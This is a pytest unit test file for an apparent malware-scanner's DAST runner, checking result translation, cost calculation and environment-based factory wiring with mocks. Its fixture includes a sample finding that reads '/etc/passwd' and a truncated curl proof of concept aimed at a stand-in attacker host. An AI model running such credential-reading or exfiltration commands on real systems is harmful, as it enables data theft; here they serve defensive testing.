"""Unit tests for DAST-102 — dast.runner.

Exercises the translation helpers (engine ↔ orchestrator shape mapping),
the generic factory (with mocked run_dast), and the env-driven
production factory (returns None when config missing, returns a callable
when env vars set).

No live API; no Fly calls.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import pytest

from dast import runner as dast_runner_mod
from dast.orchestrator import DastResult, IterationStats
from dast.runner import (
    _dast_result_to_engine_dict,
    _scan_result_to_l1_output,
    make_dast_runner,
    make_dast_runner_from_env,
)
from scanner.engine import ScanResult

# ── Translation: scan_result → l1_output ───────────────────────────────────


def _sample_scan_result() -> ScanResult:
    r = ScanResult(
        filename="exfil.py",
        file_hash="abc123",
        language="python",
        triage_classification="HIGH",
        triage_reason="...",
        final_verdict="critical_malicious",
        risk_score=95,
        risk_level="critical",
    )
    r.vulnerabilities = [
        {
            "type": "data_exfiltration",
            "severity": "critical",
            "line": 4,
            "code": "open('/etc/passwd').read()",
            "explanation": "reads sensitive system file",
            "data_flow_trace": "file_read -> base64 -> http",
            "proof_of_concept": "curl 'http://attacker.example.com/...'",
            "cwe": "CWE-200",
            "confidence": 0.95,
        },
        {
            "type": "ssrf",
            "severity": "high",
            "line": 6,
            "code": "urlopen(f'http://...')",
            "explanation": "outbound to attacker host",
        },
    ]
    r.behavioral_profile = {"sensitivity": "critical"}
    r.attack_chains = [{"name": "passwd_exfil"}]
    return r


def test_translation_maps_vulnerabilities_to_hypotheses() -> None:
    out = _scan_result_to_l1_output(_sample_scan_result())
    assert out["verdict"] == {"verdict_label": "critical_malicious"}
    assert len(out["hypotheses"]) == 2

    h1 = out["hypotheses"][0]
    assert h1["id"] == "H001"
    # finding_ref must equal id — the orchestrator only counts confirmed
    # hypotheses into new_confirmed_findings / findings_validated when
    # finding_ref is set. Without this, DAST telemetry showed 0
    # confirmed findings even when 4 hypotheses were confirmed.
    assert h1["finding_ref"] == "H001"
    assert h1["finding_type"] == "data_exfiltration"
    assert h1["severity"] == "critical"
    assert h1["line"] == 4
    assert h1["confidence"] == 0.95
    assert h1["cwe"] == "CWE-200"

    h2 = out["hypotheses"][1]
    assert h2["id"] == "H002"
    assert h2["finding_ref"] == "H002"
    assert h2["finding_type"] == "ssrf"
    # Defaults applied for missing fields
    assert h2["confidence"] == 0.5
    assert h2["data_flow_trace"] == ""

    assert out["behavioral_profile"] == {"sensitivity": "critical"}
    assert out["attack_chains"] == [{"name": "passwd_exfil"}]


def test_translation_handles_no_vulnerabilities() -> None:
    r = _sample_scan_result()
    r.vulnerabilities = []
    out = _scan_result_to_l1_output(r)
    assert out["hypotheses"] == []
    assert out["verdict"]["verdict_label"] == "critical_malicious"


# ── Mapping: DastResult → engine dict ──────────────────────────────────────


def _sample_dast_result() -> DastResult:
    s1 = IterationStats(
        iter=1,
        new_confirmed_findings=2,
        hypotheses_proposed=3,
        hypotheses_accepted=2,
        hypotheses_rejected=1,
        sandbox_calls=5,
        elapsed_s=12.5,
        current_verdict_label="malicious",
    )
    s2 = IterationStats(
        iter=2,
        new_confirmed_findings=1,
        hypotheses_proposed=1,
        hypotheses_accepted=1,
        hypotheses_rejected=0,
        sandbox_calls=2,
        elapsed_s=8.0,
        iter_erosion_guard_fired=True,
        current_verdict_label="critical_malicious",
    )
    return DastResult(
        file_id="abc123",
        iterations=[s1, s2],
        final_verdict={"verdict_label": "critical_malicious", "confidence": 0.9},
        findings_validated=["F1", "F2"],
        total_tokens_in=10000,
        total_tokens_out=5000,
        total_sandbox_calls=7,
        elapsed_s=20.5,
        stop_reason="reached_max_iterations",
        journal_path=__import__("pathlib").Path("/tmp/journal"),
    )


def test_mapping_basic() -> None:
    out = _dast_result_to_engine_dict(_sample_dast_result(), elapsed_ms=20500)
    assert out["validated_findings"] == ["F1", "F2"]
    assert out["final_verdict"]["verdict_label"] == "critical_malicious"
    assert out["elapsed_ms"] == 20500
    assert out["stop_reason"] == "reached_max_iterations"
    assert len(out["iterations"]) == 2
    assert out["iterations"][1]["iter_erosion_guard_fired"] is True


def test_mapping_cost_math() -> None:
    """10000 in × $3/M + 5000 out × $15/M = 0.030 + 0.075 = 0.105."""
    out = _dast_result_to_engine_dict(_sample_dast_result(), elapsed_ms=0)
    assert out["total_cost_usd"] == pytest.approx(0.105)


# ── make_dast_runner end-to-end (mocked run_dast) ──────────────────────────


@dataclass
class _FakeStubSandbox:
    file_content_map: dict[str, bytes] = field(default_factory=dict)


@dataclass
class _FakePreprocessing:
    file_hash: str = "fake_hash_123"


@pytest.mark.asyncio
async def test_runner_calls_orchestrator_with_correct_payload(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    inference_calls: list = []

    async def fake_inference(prompt, options, schema):
        inference_calls.append((prompt[:20], options, schema))
        return {"text": "{}", "usage": {}, "finish_reason": "stop"}

    sandbox = _FakeStubSandbox()
    runner = make_dast_runner(
        inference=fake_inference,
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )

    pp = _FakePreprocessing(file_hash="abc123")
    scan_result = _sample_scan_result()
    out = await runner("exfil.py", b"import os\n", pp, scan_result)

    # Orchestrator received the right shape
    assert captured["file_record"]["file_id"] == "abc123"
    assert captured["file_record"]["source_text"] == "import os\n"
    assert captured["sandbox"] is sandbox
    assert captured["inference"] is fake_inference
    # Engine-shape output
    assert out["validated_findings"] == ["F1", "F2"]
    assert out["final_verdict"]["verdict_label"] == "critical_malicious"
    assert out["total_cost_usd"] == pytest.approx(0.105)

    # File content was loaded into the sandbox map
    assert sandbox.file_content_map["abc123"] == b"import os\n"


@pytest.mark.asyncio
async def test_runner_falls_back_to_filename_when_no_file_hash(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=_FakeStubSandbox(),
        journal_dir=tmp_path,
    )
    # pp has no file_hash → falls back to filename
    pp = _FakePreprocessing(file_hash="")
    await runner("anon.py", b"x = 1\n", pp, _sample_scan_result())
    assert captured["file_record"]["file_id"] == "anon.py"


# ── make_dast_runner_from_env ──────────────────────────────────────────────


def test_from_env_returns_none_when_anthropic_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("FLY_API_TOKEN", "fake")
    monkeypatch.setenv("ECHO_DAST_IMAGE_MINIMAL", "fake-image:v1")
    assert make_dast_runner_from_env() is None


def test_from_env_returns_none_when_fly_token_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.delenv("FLY_API_TOKEN", raising=False)
    monkeypatch.setenv("ECHO_DAST_IMAGE_MINIMAL", "fake-image:v1")
    assert make_dast_runner_from_env() is None


def test_from_env_returns_none_when_image_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.delenv("ECHO_DAST_IMAGE_MINIMAL", raising=False)
    assert make_dast_runner_from_env() is None


def test_from_env_returns_callable_when_all_set(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """With all required env vars, returns a callable runner. We don't
    exercise it (would need Fly + Anthropic) — the type confirms wiring.
    """
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.setenv("ECHO_DAST_IMAGE_MINIMAL", "registry.fly.io/argus-dast-sandbox:minimal-v1")
    runner = make_dast_runner_from_env()
    assert runner is not None
    assert callable(runner)


def test_from_env_explicit_api_key_overrides_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.setenv("ECHO_DAST_IMAGE_MINIMAL", "fake:v1")
    runner = make_dast_runner_from_env(api_key="sk-from-arg")
    assert runner is not None
